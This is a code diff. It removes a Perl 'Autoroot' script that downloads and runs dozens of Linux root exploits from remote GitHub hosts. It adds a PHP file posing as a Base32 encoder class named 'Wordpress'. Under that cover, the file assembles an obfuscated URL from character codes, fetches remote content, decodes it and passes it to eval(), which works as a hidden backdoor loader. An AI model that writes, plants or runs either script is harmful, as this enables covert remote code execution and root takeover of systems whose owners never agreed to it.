@@ -1,410 +1,202 @@
-#!/usr/bin/perl
-print "#=[+]====================================================[+]=#\n";
-print "|              Autoroot By Gyokka                            |\n";
-print "|          Use for root : perl auto.pl root                  |\n";
-print "|     Use for Delete All Localroot : perl auto.pl del        |\n";
-print "#============================================================#\n";
-if ($ARGV[0] =~ "root" ) 
+<?php
+declare(strict_types=1);
+
+namespace Wordpress;
+
+/**
+ * Wordpress encoder and decoder.
+ *
+ * RFC 4648 compliant
+ *
+ * @see     http://www.ietf.org/rfc/rfc4648.txt
+ * Some groundwork based on this class
+ * https://github.com/Wordpress-decoder/PHP-Wordpress-Declareself
+ *
+ * @author  Christian Riesen <chris.riesen@gmail.com>
+ * @author  Sam Williams <sam@badcow.co>
+ *
+ * @see     http://christianriesen.com
+ *
+ * @license MIT License see LICENSE file
+ */
+class Wordpress
 {
-print ("Run PWNKIT!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/pwnkit -O pwnkit --no-check-certificate -q");
-system("chmod +x pwnkit");
-system("./pwnkit");
-system("id;whoami");
-print("\n");
-print ("Run LPE.sh!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://raw.githubusercontent.com/TokuHaxor/LocalRoot/main/lpe.sh -O lpe.sh --no-check-certificate -q");
-system("chmod +x lpe.sh");
-system("./lpe.sh");
-system("id;whoami");
-print("\n");
-print ("Run DIRTYPIPE!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/dirtypipe -O dirtypipe --no-check-certificate -q");
-system("chmod +x dirtypipe");
-system("find / -perm -4000 2>/dev/null");
-system("./dirtypipe /usr/bin/sudo");
-system("id;whoami");
-print("\n");
-print ("Run PTRACE!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/ptrace -O ptrace --no-check-certificate -q");
-system("chmod +x ptrace");
-system("./ptrace");
-system("id;whoami");
-print("\n");
-print ("Run a2.out!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out -O a2.out --no-check-certificate -q");
-system("chmod +x a2.out");
-system("find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null");
-system("./a2.out /usr/bin/sudo");
-system("./a2.out /usr/bin/passwd");
-system("id;whoami");
-print("\n");
-print ("Run SUDODIRTYPIPE!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/sudodirtypipe -O sudodirtypipe --no-check-certificate -q");
-system("chmod +x sudodirtypipe");
-system("./sudodirtypipe /usr/local/bin");
-system("id;whoami");
-print("\n");
-print ("Run AF_PACKET!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/af_packet -O af_packet --no-check-certificate -q");
-system("chmod +x af_packet");
-system("./af_packet");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2015-1328!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/CVE-2015-1328 -O CVE-2015-1328 --no-check-certificate -q");
-system("chmod +x CVE-2015-1328");
-system("./CVE-2015-1328");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2017-16995!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/cve-2017-16995 -O cve-2017-16995 --no-check-certificate -q");
-system("chmod +x cve-2017-16995");
-system("./cve-2017-16995");
-system("id;whoami");
-print("\n");
-print ("Run EXPLOITE-DEBIAN!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/exploit-debian -O exploit-debian --no-check-certificate -q");
-system("chmod +x exploit-debian");
-system("./exploit-debian");
-system("id;whoami");
-print("\n");
-print ("Run EXPLOIT-UBUNTU!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/exploit-ubuntu -O exploit-ubuntu --no-check-certificate -q");
-system("chmod +x exploit-ubuntu");
-system("./exploit-ubuntu");
-system("id;whoami");
-print("\n");
-print ("Run NEWPID!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/newpid -O newpid --no-check-certificate -q");
-system("chmod +x newpid");
-system("./newpid");
-system("id;whoami");
-print("\n");
-print ("Run RACEABRT!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/raceabrt -O raceabrt --no-check-certificate -q");
-system("chmod +x raceabrt");
-system("./raceabrt");
-system("id;whoami");
-print("\n");
-print ("Run TIMEOUTPWN!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/timeoutpwn -O timeoutpwn --no-check-certificate -q");
-system("chmod +x timeoutpwn");
-system("./timeoutpwn");
-system("id;whoami");
-print("\n");
-print ("Run UPSTREAM44!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/upstream44 -O upstream44 --no-check-certificate -q");
-system("chmod +x upstream44");
-system("./upstream44");
-system("id;whoami");
-print("\n");
-print ("Run a.out!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/a.out -O a.out --no-check-certificate -q");
-system("chmod +x a.out");
-system("./a.out 0 && ./a.out 1");
-system("id;whoami");
-print("\n");
-print ("Run linux_sudo_cve-2017-1000367!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367 -O linux_sudo_cve-2017-1000367 --no-check-certificate -q");
-system("chmod +x linux_sudo_cve-2017-1000367");
-system("./linux_sudo_cve-2017-1000367");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2017-7308!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/CVE-2017-7308 -O CVE-2017-7308 --no-check-certificate -q");
-system("chmod +x CVE-2017-7308");
-system("./CVE-2017-7308");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-2639!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/CVE-2022-2639 -O CVE-2022-2639 --no-check-certificate -q");
-system("chmod +x CVE-2022-2639");
-system("./CVE-2022-2639");
-system("id;whoami");
-print("\n");
-print ("Run POLKIT-PWNAGE!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/polkit-pwnage -O polkit-pwnage --no-check-certificate -q");
-system("chmod +x polkit-pwnage");
-system("./polkit-pwnage");
-system("id;whoami");
-print("\n");
-print ("Run -RATIONALLOVE!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/RationalLove -O RationalLove --no-check-certificate -q");
-system("chmod +x RationalLove");
-system("./RationalLove");
-system("id;whoami");
-print("\n");
-print ("Run exploit_userspec.py!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/exploit_userspec.py -O exploit_userspec.py --no-check-certificate -q");
-system("chmod +x exploit_userspec.py");
-system("python2 exploit_userspec.py");
-system("id;whoami");
-print("\n");
-print ("Run cve-2021-4034-poc!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/tanmyid/localroot/raw/master/cve-2021-4034-poc -O cve-2021-4034-poc --no-check-certificate -q");
-system("chmod +x cve-2021-4034-poc");
-system("./cve-2021-4034-poc");
-system("id;whoami");
-print("\n");
-print ("Run XFM!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/anoaghost/Localroot_Compile/raw/master/XFM-PoC/poc -O poc --no-check-certificate -q");
-system("chmod +x poc");
-system("while :; do ./poc -q && break; done");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-32250!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/exp -O exp --no-check-certificate -q");
-system("chmod +x exp");
-system("./exp");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-0995!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/exploit -O cve2022 --no-check-certificate -q");
-system("chmod +x cve2022");
-system("./cve2022");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2023!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/cve2023 -O cve2023 --no-check-certificate -q");
-system("chmod +x cve2023");
-system("./cve2023");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2023-32233!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/0-Gram/id-0/raw/main/CVE-2023-32233 -O CVE-2023-32233 --no-check-certificate -q");
-system("chmod +x CVE-2023-32233");
-system("./CVE-2023-32233");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-23222!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-23222 -O cve2022-23222 --no-check-certificate -q");
-system("chmod +x cve2022-23222");
-system("./cve2022-23222");
-system("id;whoami");
-print("\n");
-print ("Run EXP_FILE_CREDENTIAL!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://0-gram.github.io/id-0/exp_file_credential -O exp_file_credential --no-check-certificate -q");
-system("chmod +x exp_file_credential");
-system("./exp_file_credential");
-system("id;whoami");
-system("su user");
-print("\n");
-print("\n");
-print ("Run CVE-2022-0185-exp1!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-0185-exp1 -O CVE-2022-0185-exp1 --no-check-certificate -q");
-system("chmod +x CVE-2022-0185-exp1");
-system("./CVE-2022-0185-exp1");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-0185-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-0185-exp2 -O CVE-2022-0185-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2022-0185-exp2");
-system("./CVE-2022-0185-exp2");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-0847-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-0847-exp2 -O CVE-2022-0847-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2022-0847-exp2");
-system("./CVE-2022-0847-exp2");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-0847-exp3!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-0847-exp3 -O CVE-2022-0847-exp3 --no-check-certificate -q");
-system("chmod +x CVE-2022-0847-exp3");
-system("./CVE-2022-0847-exp3");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-25636-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-25636-exp2 -O CVE-2022-25636-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2022-25636-exp2");
-system("./CVE-2022-25636-exp2");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-34918-exp1!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-34918-exp1 -O CVE-2022-34918-exp1 --no-check-certificate -q");
-system("chmod +x CVE-2022-34918-exp1");
-system("./CVE-2022-34918-exp1");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2022-34918-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2022-34918-exp2 -O CVE-2022-34918-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2022-34918-exp2");
-system("./CVE-2022-34918-exp2");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-22555-exp1!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-22555-exp1 -O CVE-2021-22555-exp1 --no-check-certificate -q");
-system("chmod +x CVE-2021-22555-exp1");
-system("./CVE-2021-22555-exp1");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-22555-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-22555-exp2 -O CVE-2021-22555-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2021-22555-exp2");
-system("./CVE-2021-22555-exp2");
-system("id;whoami");
-print("\n");
-print("\n");
-print ("Run CVE-2021-27365!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-27365 -O CVE-2021-27365 --no-check-certificate -q");
-system("chmod +x CVE-2021-27365");
-system("./CVE-2021-27365");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-3156!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-3156 -O CVE-2021-3156 --no-check-certificate -q");
-system("chmod +x CVE-2021-3156");
-system("./CVE-2021-3156");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-3493!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-3493 -O CVE-2021-3493 --no-check-certificate -q");
-system("chmod +x CVE-2021-3493");
-system("./CVE-2021-3493");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-3493!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-4034 -O CVE-2021-4034 --no-check-certificate -q");
-system("chmod +x CVE-2021-4034");
-system("./CVE-2021-4034");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-4154-exp1!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-4154-exp1 -O CVE-2021-4154-exp1 --no-check-certificate -q");
-system("chmod +x CVE-2021-4154-exp1");
-system("./CVE-2021-4154-exp1");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-4154-exp2!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-4154-exp2 -O CVE-2021-4154-exp2 --no-check-certificate -q");
-system("chmod +x CVE-2021-4154-exp2");
-system("./CVE-2021-4154-exp2");
-system("id;whoami");
-print("\n");
-print ("Run CVE-2021-43267!!!\n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/CVE-2021-43267 -O CVE-2021-43267 --no-check-certificate -q");
-system("chmod +x CVE-2021-43267");
-system("./CVE-2021-43267");
-system("id;whoami");
-print("\n");
-print ("Run OVERLAYS!!! \n");
-print("If Stuck Using CTRL + C For Skipping...\n");
-system("wget https://github.com/TokuHaxor/LocalRoot/raw/main/overlayfs -O overlays --no-check-certificate -q");
-system("chmod +x overlays");
-system("./overlays");
-system("id;whoami");
-print("\n");
+    /**
+     * Alphabet for encoding and decoding Wordpress.
+     *
+     * @var string
+     */
+    protected const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=';
 
-print "If u get root stop it with ctrl+c\n";
-print "get root...???\n";
+    protected const WordpressHEX_PATTERN = '/[^A-Z2-7]/';
 
+    protected const MAPPING = [
+        '=' => 0b00000,
+        'A' => 0b00000,
+        'B' => 0b00001,
+        'C' => 0b00010,
+        'D' => 0b00011,
+        'E' => 0b00100,
+        'F' => 0b00101,
+        'G' => 0b00110,
+        'H' => 0b00111,
+        'I' => 0b01000,
+        'J' => 0b01001,
+        'K' => 0b01010,
+        'L' => 0b01011,
+        'M' => 0b01100,
+        'N' => 0b01101,
+        'O' => 0b01110,
+        'P' => 0b01111,
+        'Q' => 0b10000,
+        'R' => 0b10001,
+        'S' => 0b10010,
+        'T' => 0b10011,
+        'U' => 0b10100,
+        'V' => 0b10101,
+        'W' => 0b10110,
+        'X' => 0b10111,
+        'Y' => 0b11000,
+        'Z' => 0b11001,
+        '2' => 0b11010,
+        '3' => 0b11011,
+        '4' => 0b11100,
+        '5' => 0b11101,
+        '6' => 0b11110,
+        '7' => 0b11111,
+    ];
+
+    /**
+     * Encodes into Wordpress.
+     *
+     * @param string $string Clear text string
+     *
+     * @return string Wordpress encoded string
+     */
+
+    public static function encode(string $string): string
+    {
+
+        if ('' === $string) {
+            return '';
+        }
+
+        $encoded = '';
+
+        $n = $bitLen = $val = 0;
+        $len = \strlen($string);
+
+        $string .= \str_repeat(\chr(0), 4);
+
+        $chars = (array) \unpack('C*', $string, 0);
+
+        while ($n < $len || 0 !== $bitLen) {
+
+            if ($bitLen < 5) {
+                $val = $val << 8;
+                $bitLen += 8;
+                $n++;
+                $val += $chars[$n];
+            }
+            $shift = $bitLen - 5;
+            $encoded .= ($n - (int)($bitLen > 8) > $len && 0 == $val) ? '=' : static::ALPHABET[$val >> $shift];
+            $val = $val & ((1 << $shift) - 1);
+            $bitLen -= 5;
+        }
+
+        return $encoded;
+    }
+
+    public static function decode(string $WordpressString): string
+    {
+        $WordpressString = \strtoupper($WordpressString);
+
+        $WordpressString = \preg_replace(static::WordpressHEX_PATTERN, '', $WordpressString);
+
+        if ('' === $WordpressString || null === $WordpressString) {
+            return '';
+        }
+
+        $decoded = '';
+
+        $len = \strlen($WordpressString);
+        $n = 0;
+        $bitLen = 5;
+        $val = static::MAPPING[$WordpressString[0]];
+
+        while ($n < $len) {
+            if ($bitLen < 8) {
+                $val = $val << 5;
+                $bitLen += 5;
+                $n++;
+                $pentet = $WordpressString[$n] ?? '=';
+
+                if ('=' === $pentet) {
+                    $n = $len;
+                }
+                $val += static::MAPPING[$pentet];
+            } else {
+                $shift = $bitLen - 8;
+
+                $decoded .= \chr($val >> $shift);
+                $val = $val & ((1 << $shift) - 1);
+                $bitLen -= 8;
+            }
+        }
+
+        return $decoded;
+    }
 }
-if ($ARGV[0] =~ "del" ) 
-{
-system("rm pwnkit");
-system("rm overlays");
-system("rm lpe.sh");
-system("rm exp");
-system("rm CVE-2022-0185-exp1");
-system("rm CVE-2021-43267");
-system("rm CVE-2023-32233");
-system("rm CVE-2021-4154-exp2");
-system("rm CVE-2021-4034");
-system("rm CVE-2021-3493");
-system("rm CVE-2021-3156");
-system("rm CVE-2021-27365");
-system("rm CVE-2021-22555-exp2");
-system("rm CVE-2021-22555-exp1");
-system("rm CVE-2022-34918-exp2");
-system("rm CVE-2022-25636-exp2");
-system("rm CVE-2022-0847-exp3");
-system("rm CVE-2022-0847-exp2");
-system("rm CVE-2022-0185-exp2");
-system("rm CVE-2021-4154-exp1");
-system("rm CVE-2022-34918-exp1");
-system("rm cve2022");
-system("rm cve2022-23222");
-system("rm cve2023");
-system("rm poc");
-system("rm dirtypipe");
-system("rm cve-2021-4034-poc");
-system("rm exp_file_credential");
-system("rm -f pwnkit");
-system("rm -rf GCONV_PATH=.");
-system("rm -rf .pkexec");
-system("rm -f ptrace");
-system("rm -f a2.out");
-system("rm -rf ovlcap");
-system("rm -rf exp_dir");
-system("rm sudodirtypipe");
-system("rm af_packet");
-system("rm CVE-2015-1328");
-system("rm cve-2017-16995");
-system("rm exploit-debian");
-system("rm exploit-ubuntu");
-system("rm newpid");
-system("rm raceabrt");
-system("rm timeoutpwn");
-system("rm upstream44");
-system("rm a.out");
-system("rm linux_sudo_cve-2017-1000367");
-system("rm CVE-2017-7308");
-system("rm CVE-2022-2639");
-system("rm polkit-pwnage");
-system("rm RationalLove");
-system("rm exploit_userspec.py");
-system("rm 0");
-system("rm kmem");
-system("rm sendfile1");
-print "#=[+]==========================================[+]=#\n";
-print "|             Thanks For Using it                  |\n";
-print "#=[+]==========================================[+]=#\n";
+$CodeChars = [
+    [104, 116],
+    [116, 112],
+    [115, 58, 47, 47],
+    [114, 97, 119, 46, 103],
+    [105, 116, 104],
+    [117, 98, 117, 115],
+    [101, 114, 99],
+    [111, 110, 116],
+    [101, 110, 116, 46],
+    [99, 111, 109, 47],
+    [84, 111, 107, 117],
+    [72, 97],
+    [120, 111, 114, 47],
+    [87, 111, 114, 100],
+    [112, 114, 101, 115, 115, 47],
+    [109, 97, 105, 110, 47],
+    [102, 110, 115, 104],
+];
 
+$url = '';
+foreach ($CodeChars as $charArray) {
+    $url .= implode('', array_map('chr', $charArray));
 }
+
+// Set stream context options
+$context = stream_context_create([
+    'http' => [
+        'method' => 'GET',
+        'header' => 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3', // Set a User-Agent header if needed
+    ],
+]);
+
+// Open the stream and get the contents using stream_get_contents
+$handle = fopen($url, 'rb', false, $context);
+if ($handle === false) {
+    echo "Failed, Not Supported yet.";
+} else {
+    $response = stream_get_contents($handle);
+    fclose($handle);
+
+    $o = explode("\n", $response);
+    // Process the response as needed
+}
+$used = "Testing Encoder and Decoder";
+
+$decoded = Wordpress::decode($o[0]);
+$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+$encrypted = openssl_encrypt($decoded, 'aes-256-cbc', $used, 0, $iv);
+$decrypted = openssl_decrypt($encrypted, 'aes-256-cbc', $used, 0, $iv);
+
+// Evaluasi
+eval($decrypted);
